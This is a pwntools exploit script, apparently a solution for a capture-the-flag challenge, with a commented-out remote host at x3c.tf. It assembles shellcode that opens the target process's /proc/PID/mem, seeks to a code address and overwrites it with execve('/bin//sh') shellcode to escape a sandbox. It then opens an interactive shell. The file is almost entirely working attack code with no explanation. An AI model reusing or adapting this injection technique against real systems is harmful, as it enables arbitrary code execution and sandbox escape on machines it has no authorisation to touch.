from pwn import *

context.arch = 'amd64'
r = process(["./chall"])
#r = remote("3a1c5799-2da8-4f8e-8562-890c0ed98533.x3c.tf",31337,ssl=True)
r.recvuntil(b':')
pid = int(r.recvline().strip(),10)

pl = asm(f'''
        xor edx,edx
        mov esi,0x1
        lea rdi,[rip+stuff]
        mov rax,0x2
        syscall
        mov rdi,rax
        mov rsi,0x421a80
        xor rdx,rdx
        mov rax,0x8
        syscall
        mov rdi,0x3
        lea rsi,[rip+shellcode]
        mov rdx,0x100
        mov rax,0x1
        syscall
        ret
        stuff:
                .string "/proc/{pid}/mem"
        shellcode:
                .byte 0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62
                .byte 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54, 0x5f,0x6a,0x3b,0x58,0x99,0x0f,0x05

'''
)
print(pl)
context.terminal=['st']

#gdb.attach(r,'''b *setup_sandbox+0x14d''')

r.send(pl)
r.interactive()
